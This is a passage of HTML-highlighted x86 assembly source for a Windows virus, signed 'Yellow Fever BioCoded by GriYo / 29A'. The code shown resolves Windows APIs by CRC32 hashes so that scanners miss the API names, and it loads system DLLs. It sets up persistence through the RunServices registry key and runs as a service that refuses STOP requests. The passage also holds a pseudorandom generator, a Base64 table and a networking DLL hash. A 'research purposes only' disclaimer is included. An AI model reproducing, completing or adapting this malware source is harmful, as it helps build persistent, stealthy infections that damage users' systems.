                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CheckDllName</span><span class="sc0">

</span><span class="sc5">EVirLoadLib</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OkCheckDll</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_SearchSystemDLL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StringBuffer</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Win32FindData.WFD_szFileName</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EVirLoadLib</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_APIs</span><span class="sc0">
                        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">OkVirLoadLib</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OkVirLoadLib</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get the entry-point of each needed API</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This routine uses the CRC32 instead of API names</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  ebx -&gt; Base address of DLL</span><span class="sc0">
</span><span class="sc1">;       ecx -&gt; Number of APIs in the folling buffer</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Buffer filled with the CRC32 of each API name</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Recives found API addresses</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   ecx -&gt; Is 00000000h if everything was ok</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_APIs</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">cld</span><span class="sc0">             
</span><span class="sc5">get_each_API</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">                

</span><span class="sc5">API_Loop</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CRC_API_found</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">API_Loop</span><span class="sc0">
</span><span class="sc5">get_API_error</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">CRC_API_found</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_API_error</span><span class="sc0">
                
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_each_API</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;This routine takes a string pointed by esi and copies</span><span class="sc0">
</span><span class="sc1">;it into a buffer pointed by edi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;The result string will be converted to upper-case</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi -&gt; Pointer to source string</span><span class="sc0">
</span><span class="sc1">;       edi -&gt; Pointer to returned string</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   al  -&gt; Null</span><span class="sc0">
</span><span class="sc1">;       edx -&gt; Points to character next to last \
;       edi -&gt; Points 1byte above the null terminator</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">StringParser</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">ScanZstring</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">               
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">IsNotLowerCase</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"z"</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">IsNotLowerCase</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
</span><span class="sc5">IsNotLowerCase</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoSlashAtPos</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">NoSlashAtPos</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ScanZstring</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Linear congruent pseudorandom number generator</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  None</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; Random number</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetRND</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SeedRND</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
                        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SeedRND</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Returns a random number into specified range ( 0 &lt;= n &lt; eax )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  eax -&gt; Max. range</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   eax -&gt; Random number</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetRangeRND</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetRND</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">  
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">               </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;########################################################################################################################################################</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">               </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">szKERNEL32DLL</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">szCommandLine</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'/29A'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">szWin9xKeyName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">Base64DecodeTable</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'F'</span><span class="sc4">,</span><span class="sc12">'G'</span><span class="sc4">,</span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'Q'</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc4">,</span><span class="sc12">'W'</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc12">'Y'</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'b'</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc12">'g'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'j'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'p'</span><span class="sc4">,</span><span class="sc12">'q'</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'v'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'x'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc4">,</span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc12">'4'</span><span class="sc4">,</span><span class="sc12">'5'</span><span class="sc4">,</span><span class="sc12">'6'</span><span class="sc4">,</span><span class="sc12">'7'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'8'</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">

</span><span class="sc5">SizeOfBase64DecodeTable</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Base64DecodeTable</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">opcodeINT03</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">      </span><span class="sc1">;Break-point</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SERVICE_RUNNING</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">SERVICE_ACCEPT_SHUTDOWN</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">

</span><span class="sc5">ServiceStatusStructure</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">SERVICE_WIN32_OWN_PROCESS</span><span class="sc0">    </span><span class="sc1">;dwServiceType </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">SERVICE_RUNNING</span><span class="sc0">      </span><span class="sc1">;dwCurrentState </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">SERVICE_ACCEPT_SHUTDOWN</span><span class="sc0">  </span><span class="sc1">;dwControlsAccepted </span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Dont allow STOP, only SHUTDOWN</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The service is notified when system shutdown</span><span class="sc0">
                </span><span class="sc1">;occurs</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;This flag allows the service to receive the</span><span class="sc0">
                </span><span class="sc1">;SERVICE_CONTROL_SHUTDOWN value</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Note that ControlService cannot send this</span><span class="sc0">
                </span><span class="sc1">;control code, only the system can send</span><span class="sc0">
                </span><span class="sc1">;SERVICE_CONTROL_SHUTDOWN</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">            </span><span class="sc1">;dwWin32ExitCode </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">            </span><span class="sc1">;dwServiceSpecificExitCode </span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">            </span><span class="sc1">;dwCheckPoint</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">           </span><span class="sc1">;dwWaitHint </span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'['</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Yellow Fever BioCoded by GriYo / 29A'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ]'</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'['</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Disclaimer: This software has been'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' designed for research purposes only.'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' The author is not responsible for any'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' problems caused due to improper or'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' illegal usage of it'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ]'</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcGetProcAddress</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0a5e34bc2h</span><span class="sc0">
</span><span class="sc5">CrcKERNEL32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0f2c501c3h</span><span class="sc0">
</span><span class="sc5">CrcUSER32</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">666f8db0h</span><span class="sc0">
</span><span class="sc5">CrcADVAPI32</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0eb9f7b65h</span><span class="sc0">
</span><span class="sc5">CrcWSOCK32</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be2cf7dah</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcApisKERNEL32</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC__CloseHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b87a006fh</span><span class="sc0">
</span><span class="sc5">CRC__ContinueDebugEvent</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">027e3a9bh</span><span class="sc0">
</span><span class="sc5">CRC__CopyFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3dd13a04h</span><span class="sc0">
</span><span class="sc5">CRC__CreateFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7ed7136ah</span><span class="sc0">
